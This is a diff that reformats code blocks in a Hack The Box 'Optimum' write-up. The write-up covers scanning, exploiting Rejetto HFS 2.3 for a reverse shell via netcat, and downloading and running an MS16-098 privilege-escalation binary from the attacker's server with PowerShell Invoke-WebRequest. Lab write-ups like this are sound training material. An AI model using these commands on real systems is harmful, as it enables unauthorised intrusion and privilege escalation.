@@ -12,7 +12,8 @@ Optimum is another OSCP-like box from the HTB 'retired' archive.
 
 `nmap -sV -Pn --min-rate 10000 10.10.10.8 |tee -a opt.txt`
 
-{% highlight ruby %}
+```
+
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-25 11:51 EST
 Nmap scan report for 10.10.10.8
 Host is up (0.092s latency).
@@ -20,11 +21,13 @@ Not shown: 999 filtered ports
 PORT   STATE SERVICE VERSION
 80/tcp open  http    HttpFileServer httpd 2.3
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-{% endhighlight %}
+
+```
 
 `searchsploit hfs 2.3`
 
-{% highlight ruby %}
+```
+
 ----------------------------------------------------- ----------------------------------
  Exploit Title                                       |  Path
                                                      | (/opt/exploitdb/)
@@ -34,18 +37,22 @@ Rejetto HTTP File Server (HFS) 2.3.x - Remote Comman | exploits/windows/remote/3
 Rejetto HTTP File Server (HFS) 2.3.x - Remote Comman | exploits/windows/remote/39161.py
 Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remo | exploits/windows/webapps/34852.tx
 ----------------------------------------------------- ----------------------------------
-{% endhighlight %}
+
+```
 
 We'll check out the python script, `searchsploit -m 39161.py` will copy the exploit to the pwd.
 ...looks promising...
 
-{% highlight ruby %}
+```
+
 python 39161.py 10.10.10.8 80
-{% endhighlight %}
+
+```
 
 we get user shell...to our nc listener on port 443.
 
-{% highlight ruby %}
+```
+
 root@kali:~/HTB/retired/optimum# nc -nlvp 443
 listening on [any] 443 ...
 connect to [10.10.14.19] from (UNKNOWN) [10.10.10.8] 49172
@@ -70,8 +77,8 @@ dir
 C:\Users\kostas\Desktop>type user.txt.txt
 type user.txt.txt
 d0xxxxxxxxxxxxxxxxxxxxxx73
-{% endhighlight %}
 
+```
 
 #########################
 
@@ -93,14 +100,17 @@ I selected ms16-098 and downloaded the exploit from github...
 served it with `python3 -m http.server 80`
 I used the IWR (Invoke-WebRequest)powershell command to move the file into my boo folder on the target.
 
-{% highlight ruby %}
+```
+
 C:\boo>powershell iwr -uri http://10.10.14.19/bfill.exe -outfile .\b.exe
 powershell iwr -uri http://10.10.14.19/bfill.exe -outfile .\b.exe
-{% endhighlight %}
+
+```
 
 So just run it....
 
-{% highlight ruby %}
+```
+
 C:\boo>c:\boo\b.exe
 c:\boo\b.exe
 Microsoft Windows [Version 6.3.9600]
@@ -117,7 +127,8 @@ From here we can just grab the root.txt flag...
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
 51xxxxxxxxxxxxxxxxxxxxxxxxxxxxed
-{% endhighlight %}
+
+```
 
 :)
 
